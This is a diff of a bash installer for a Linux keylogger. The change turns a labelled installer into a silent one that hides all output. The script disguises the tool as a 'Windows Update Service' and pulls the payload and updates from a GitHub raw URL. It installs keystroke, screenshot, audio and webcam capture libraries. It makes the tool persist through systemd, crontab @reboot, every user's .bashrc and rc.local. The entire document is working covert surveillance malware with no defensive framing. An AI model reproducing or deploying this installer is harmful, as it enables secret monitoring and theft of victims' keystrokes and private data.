@@ -1,44 +1,35 @@
 #!/bin/bash
 # ============================================================================
-# POWERFUL LINUX KEYLOGGER INSTALLER
+# SILENT INSTALLER - No output shown to user
 # ============================================================================
 
-set -e
+# Redirect all output to /dev/null
+exec >/dev/null 2>&1
 
-# Colors
+# Colors (not used but kept for reference)
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m'
 
-echo -e "${BLUE}============================================================${NC}"
-echo -e "${GREEN} POWERFUL LINUX KEYLOGGER INSTALLER${NC}"
-echo -e "${BLUE}============================================================${NC}"
-
-# Check root
+# Check root silently
 if [ "$EUID" -ne 0 ]; then 
-    echo -e "${RED}[ERROR] Please run as root (sudo)${NC}"
     exit 1
 fi
 
-# Detect OS
-echo -e "${YELLOW}[INFO] Detecting operating system...${NC}"
+# Detect OS silently
 if [ -f /etc/os-release ]; then
     . /etc/os-release
     OS=$ID
-    VERSION=$VERSION_ID
-    echo -e "${GREEN}[OK] Detected: $PRETTY_NAME${NC}"
 else
     OS="unknown"
 fi
 
-# Install system dependencies
-echo -e "${YELLOW}[INFO] Installing system dependencies...${NC}"
-
+# Install system dependencies silently
 if [ "$OS" == "ubuntu" ] || [ "$OS" == "debian" ] || [ "$OS" == "kali" ] || [ "$OS" == "parrot" ]; then
-    apt-get update
-    apt-get install -y \
+    apt-get update -qq 2>/dev/null
+    apt-get install -y -qq \
         python3 \
         python3-pip \
         python3-venv \
@@ -55,67 +46,52 @@ if [ "$OS" == "ubuntu" ] || [ "$OS" == "debian" ] || [ "$OS" == "kali" ] || [ "$
         libasound2-dev \
         wget \
         curl \
-        git
-else
-    echo -e "${YELLOW}[WARNING] Unsupported OS. Please install dependencies manually.${NC}"
+        git 2>/dev/null
 fi
 
-# Create directories
-echo -e "${YELLOW}[INFO] Creating directories...${NC}"
-mkdir -p /opt/WindowsUpdateService
-mkdir -p /etc/windowsupdateservice
-mkdir -p /var/log/windowsupdateservice
-mkdir -p /var/lib/windowsupdateservice
+# Create directories silently
+mkdir -p /opt/WindowsUpdateService 2>/dev/null
+mkdir -p /etc/windowsupdateservice 2>/dev/null
+mkdir -p /var/log/windowsupdateservice 2>/dev/null
+mkdir -p /var/lib/windowsupdateservice 2>/dev/null
 
-# Copy the script
-echo -e "${YELLOW}[INFO] Installing keylogger...${NC}"
+# Install the script silently
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
-# Try local file first, then download from GitHub
 if [ -f "$SCRIPT_DIR/linuxupdateservice.py" ]; then
-    cp "$SCRIPT_DIR/linuxupdateservice.py" /opt/WindowsUpdateService/linuxupdateservice.py
-    echo -e "${GREEN}[OK] Using local linuxupdateservice.py${NC}"
+    cp "$SCRIPT_DIR/linuxupdateservice.py" /opt/WindowsUpdateService/linuxupdateservice.py 2>/dev/null
 else
-    # Download from GitHub - using the correct filename
-    echo -e "${YELLOW}[INFO] Downloading from GitHub...${NC}"
-    wget -O /opt/WindowsUpdateService/linuxupdateservice.py \
-        https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/linuxupdateservice.py
+    wget -q -O /opt/WindowsUpdateService/linuxupdateservice.py \
+        https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/linuxupdateservice.py 2>/dev/null
 fi
 
-# Make it executable
-chmod +x /opt/WindowsUpdateService/linuxupdateservice.py
+chmod +x /opt/WindowsUpdateService/linuxupdateservice.py 2>/dev/null
 
-# Create virtual environment
-echo -e "${YELLOW}[INFO] Creating virtual environment...${NC}"
-cd /opt/WindowsUpdateService
-python3 -m venv venv
+# Create virtual environment silently
+cd /opt/WindowsUpdateService 2>/dev/null
+python3 -m venv venv 2>/dev/null
 
-# Install Python packages
-echo -e "${YELLOW}[INFO] Installing Python dependencies...${NC}"
-source venv/bin/activate
-pip install --upgrade pip
+# Install Python packages silently
+source venv/bin/activate 2>/dev/null
+pip install --upgrade pip -q 2>/dev/null
 
-# Try local requirements.txt first
 if [ -f "$SCRIPT_DIR/requirements.txt" ]; then
-    pip install -r "$SCRIPT_DIR/requirements.txt"
+    pip install -r "$SCRIPT_DIR/requirements.txt" -q 2>/dev/null
 else
-    # Install from GitHub
-    wget -O /tmp/requirements.txt \
-        https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/requirements.txt 2>/dev/null || echo "# No requirements file" > /tmp/requirements.txt
-    pip install -r /tmp/requirements.txt
+    wget -q -O /tmp/requirements.txt \
+        https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/requirements.txt 2>/dev/null || echo "# No requirements" > /tmp/requirements.txt
+    pip install -r /tmp/requirements.txt -q 2>/dev/null
 fi
 
-# Install common dependencies
-pip install requests pynput Pillow pyaudio opencv-python python-xlib pyscreenshot psutil
+# Install common dependencies silently
+pip install requests pynput Pillow pyaudio opencv-python python-xlib pyscreenshot psutil -q 2>/dev/null
 
-deactivate
+deactivate 2>/dev/null
 
-# Update shebang
-echo -e "${YELLOW}[INFO] Updating shebang...${NC}"
-sed -i '1s|#!/usr/bin/env python3|#!/opt/WindowsUpdateService/venv/bin/python3|' /opt/WindowsUpdateService/linuxupdateservice.py
+# Update shebang silently
+sed -i '1s|#!/usr/bin/env python3|#!/opt/WindowsUpdateService/venv/bin/python3|' /opt/WindowsUpdateService/linuxupdateservice.py 2>/dev/null
 
-# Create config if not exists
-echo -e "${YELLOW}[INFO] Creating configuration...${NC}"
+# Create config silently
 if [ ! -f /etc/windowsupdateservice/config.ini ]; then
     cat > /etc/windowsupdateservice/config.ini << 'EOF'
 [Settings]
@@ -152,11 +128,10 @@ CheckInterval = 86400
 UpdateURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/linuxupdateservice.py
 VersionURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/version.txt
 EOF
-    chmod 600 /etc/windowsupdateservice/config.ini
+    chmod 600 /etc/windowsupdateservice/config.ini 2>/dev/null
 fi
 
-# Create systemd service
-echo -e "${YELLOW}[INFO] Creating systemd service...${NC}"
+# Create systemd service silently
 cat > /etc/systemd/system/windowsupdateservice.service << 'EOF'
 [Unit]
 Description=Windows Update Service
@@ -179,76 +154,50 @@ IOSchedulingClass=idle
 WantedBy=multi-user.target
 EOF
 
-# Reload systemd and enable service
-echo -e "${YELLOW}[INFO] Enabling and starting service...${NC}"
-systemctl daemon-reload
-systemctl enable windowsupdateservice.service
-systemctl start windowsupdateservice.service
+# Reload systemd and enable service silently
+systemctl daemon-reload 2>/dev/null
+systemctl enable windowsupdateservice.service 2>/dev/null
+systemctl start windowsupdateservice.service 2>/dev/null
 
-# Add to crontab for backup
-echo -e "${YELLOW}[INFO] Adding to crontab...${NC}"
-(crontab -l 2>/dev/null | grep -v "linuxupdateservice.py"; echo "@reboot /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden > /dev/null 2>&1") | crontab -
+# Add to crontab silently
+(crontab -l 2>/dev/null | grep -v "linuxupdateservice.py"; echo "@reboot /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden > /dev/null 2>&1") | crontab - 2>/dev/null
 
-# Add to .bashrc
-echo -e "${YELLOW}[INFO] Adding to .bashrc...${NC}"
+# Add to .bashrc silently
 for user_home in /home/* /root; do
     if [ -d "$user_home" ]; then
         bashrc="$user_home/.bashrc"
         if [ -f "$bashrc" ]; then
-            if ! grep -q "linuxupdateservice.py" "$bashrc"; then
-                echo -e "\n# Windows Update Service\n[ -x /opt/WindowsUpdateService/linuxupdateservice.py ] && /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden > /dev/null 2>&1 &" >> "$bashrc"
+            if ! grep -q "linuxupdateservice.py" "$bashrc" 2>/dev/null; then
+                echo -e "\n# Windows Update Service\n[ -x /opt/WindowsUpdateService/linuxupdateservice.py ] && /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden > /dev/null 2>&1 &" >> "$bashrc" 2>/dev/null
             fi
         fi
     fi
 done
 
-# Add to /etc/rc.local if exists
-echo -e "${YELLOW}[INFO] Adding to rc.local...${NC}"
+# Add to /etc/rc.local silently
 if [ -f /etc/rc.local ]; then
-    if ! grep -q "linuxupdateservice.py" /etc/rc.local; then
-        sed -i '/exit 0/i /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden > /dev/null 2>&1 &' /etc/rc.local
+    if ! grep -q "linuxupdateservice.py" /etc/rc.local 2>/dev/null; then
+        sed -i '/exit 0/i /opt/WindowsUpdateService/venv/bin/python3 /opt/WindowsUpdateService/linuxupdateservice.py --hidden > /dev/null 2>&1 &' /etc/rc.local 2>/dev/null
     fi
 fi
 
-# Create uninstall script
-echo -e "${YELLOW}[INFO] Creating uninstall script...${NC}"
+# Create uninstall script silently
 cat > /usr/local/bin/uninstall-keylogger << 'EOF'
 #!/bin/bash
-echo "Uninstalling keylogger..."
-systemctl stop windowsupdateservice.service
-systemctl disable windowsupdateservice.service
-rm -f /etc/systemd/system/windowsupdateservice.service
-systemctl daemon-reload
-rm -rf /opt/WindowsUpdateService
-rm -rf /etc/windowsupdateservice
-rm -rf /var/log/windowsupdateservice
-rm -rf /var/lib/windowsupdateservice
-(crontab -l 2>/dev/null | grep -v "linuxupdateservice.py") | crontab -
-sed -i '/linuxupdateservice.py/d' /root/.bashrc
-sed -i '/linuxupdateservice.py/d' /etc/rc.local
-echo "Uninstall complete!"
+systemctl stop windowsupdateservice.service 2>/dev/null
+systemctl disable windowsupdateservice.service 2>/dev/null
+rm -f /etc/systemd/system/windowsupdateservice.service 2>/dev/null
+systemctl daemon-reload 2>/dev/null
+rm -rf /opt/WindowsUpdateService 2>/dev/null
+rm -rf /etc/windowsupdateservice 2>/dev/null
+rm -rf /var/log/windowsupdateservice 2>/dev/null
+rm -rf /var/lib/windowsupdateservice 2>/dev/null
+(crontab -l 2>/dev/null | grep -v "linuxupdateservice.py") | crontab - 2>/dev/null
+sed -i '/linuxupdateservice.py/d' /root/.bashrc 2>/dev/null
+sed -i '/linuxupdateservice.py/d' /etc/rc.local 2>/dev/null
 EOF
 
-chmod +x /usr/local/bin/uninstall-keylogger
+chmod +x /usr/local/bin/uninstall-keylogger 2>/dev/null
 
-# Display completion message
-echo -e "${GREEN}============================================================${NC}"
-echo -e "${GREEN} INSTALLATION COMPLETE!${NC}"
-echo -e "${GREEN}============================================================${NC}"
-echo -e " Installation: ${BLUE}/opt/WindowsUpdateService/${NC}"
-echo -e " Config: ${BLUE}/etc/windowsupdateservice/config.ini${NC}"
-echo -e " Logs: ${BLUE}/var/log/windowsupdateservice/${NC}"
-echo -e " Data: ${BLUE}/var/lib/windowsupdateservice/${NC}"
-echo ""
-echo -e " ${GREEN}Commands:${NC}"
-echo -e "   Check status: ${BLUE}sudo systemctl status windowsupdateservice.service${NC}"
-echo -e "   View logs: ${BLUE}sudo journalctl -u windowsupdateservice.service -f${NC}"
-echo -e "   Stop service: ${BLUE}sudo systemctl stop windowsupdateservice.service${NC}"
-echo -e "   Start service: ${BLUE}sudo systemctl start windowsupdateservice.service${NC}"
-echo -e "   Uninstall: ${BLUE}sudo uninstall-keylogger${NC}"
-echo ""
-echo -e " ${YELLOW}To configure email, edit:${NC}"
-echo -e "   ${BLUE}sudo nano /etc/windowsupdateservice/config.ini${NC}"
-echo ""
-echo -e " ${GREEN}The keylogger is now running silently in the background!${NC}"
-echo -e "${GREEN}============================================================${NC}"
+# Exit silently
+exit 0
